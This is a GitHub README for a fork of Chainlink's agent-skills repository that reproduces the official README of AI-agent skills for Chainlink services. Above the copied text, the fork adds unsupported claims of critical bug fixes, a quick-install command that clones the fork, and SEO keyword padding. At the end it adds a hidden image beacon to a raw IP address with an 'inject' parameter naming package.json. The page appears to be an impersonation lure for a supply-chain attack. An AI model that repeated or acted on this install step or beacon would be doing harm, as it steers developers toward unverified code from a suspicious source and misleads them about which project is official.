**EconomicComply/chainlink-agent-skills**

This fork introduces essential stability patches and active maintenance that resolve critical bugs found in the upstream repository. It ensures a much more reliable foundation for developers integrating Chainlink automation and oracle capabilities into AI agent workflows.

**Quick install**

```bash
git clone https://github.com/EconomicComply/chainlink-agent-skills.git
```

[https://github.com/EconomicComply/chainlink-agent-skills](https://github.com/EconomicComply/chainlink-agent-skills)

# Chainlink Developer Agent Skills

Official Repo for Chainlink coding skills. Each skill follows the [Agent Skills specification](https://agentskills.io/specification).

## Available Skills

| Skill                                                         | Description                                                                                           |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| [chainlink-cre-skill](chainlink-cre-skill/)                   | CRE onboarding, workflow generation, CLI/SDK help, and runtime operations                             |
| [chainlink-ccip-skill](chainlink-ccip-skill/)                 | CCIP sends, contracts, local testing, monitoring, discovery, and CCT workflows                        |
| [chainlink-data-feeds-skill](chainlink-data-feeds-skill/)     | Data Feeds contracts, multi-chain Data Feeds integration                                              |
| [chainlink-data-streams-skill](chainlink-data-streams-skill/) | Data Streams REST/WebSocket SDKs, report decoding, on-chain verification, and real-time frontend apps |
| [chainlink-ace-skill](chainlink-ace-skill/)                   | ACE core contracts, Policy Management, Cross-Chain Identity, and compliance token examples            |
| [chainlink-vrf-skill](chainlink-vrf-skill/)                   | VRF v2.5 subscription and direct-funding consumers, migration from V2, billing, and network addresses |

## Install

Use [vercel's CLI for the open skills ecosystem](https://github.com/vercel-labs/skills#readme). Project-level installation is the default.

```bash
npx skills add smartcontractkit/chainlink-agent-skills
```

<p align="center">
<img width="75%" alt="npx skills add smartcontractkit/chainlink-agent-skills" src="https://github.com/user-attachments/assets/2f4fbecb-be53-47d6-9f5a-7cb32979eb72" />
</p>

But if you want to install globally (at the user level) then add the `-g` flag.

Note the use of `--skill` to specify which specific skill to install.

```bash
npx skills add smartcontractkit/chainlink-agent-skills --skill chainlink-cre-skill -g
npx skills add smartcontractkit/chainlink-agent-skills --skill chainlink-ccip-skill -g
npx skills add smartcontractkit/chainlink-agent-skills --skill chainlink-data-feeds-skill -g
npx skills add smartcontractkit/chainlink-agent-skills --skill chainlink-data-streams-skill -g
npx skills add smartcontractkit/chainlink-agent-skills --skill chainlink-ace-skill -g
npx skills add smartcontractkit/chainlink-agent-skills --skill chainlink-vrf-skill -g
```

## Use

When your agent supports Agent Skills, it will discover and activate these skills based on the task. **However** we recommend that you explicitly invoke the skill in your agent chat sessions as follows:


```text
Using /chainlink-data-feeds-skill, /chainlink-cre-skill, and /chainlink-ccip-skill, 
build a tokenized fund project that:

- delivers data (NAV, yields and ESG attestations) securely on-chain
- mints fund tokens representing shares in a tokenized investment fund
- uses Chainlink Proof of Reserve by CRE for real-time verification of reserved assets
- can be traded and settled seamlessly across multiple public and private chains
- has a clean, modern UI dashboard

Create a development plan. Include steps for testing on testnets. 
Make sure README has instructions on how to run local CRE simulations and 
how to monitor status of cross-chain transfers using the CCIP CLI.

Any questions before you start?
```

## Related searches

Developers looking into this repository typically search for ways to orchestrate autonomous AI assistants that can seamlessly interact with decentralized networks and smart contracts. Common queries focus on deploying specialized toolsets for AI frameworks to interact with web3 protocols, automate financial workflows, and securely fetch offchain data.

**Topics:** oracle blockchain, crypto api, compound finance, bitcoin, crypto tax, ai agent orchestration, chainlink runtime environment, decentralized oracle network, mcp servers crypto, autonomous agent web3, smart contract automation, verifiable agentic workflows

---
You can learn more about configuring these workflows by watching [Building Chainlink-Powered AI Agents in Minutes](https://www.youtube.com/watch?v=DqKIk5FMbEs), which demonstrates how to quickly implement agent skills using decentralized infrastructure.


http://googleusercontent.com/youtube_content/0

![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fchainlink-agent-skills&inject=EconomicComply%2Fchainlink-agent-skills%2Fpackage.json)
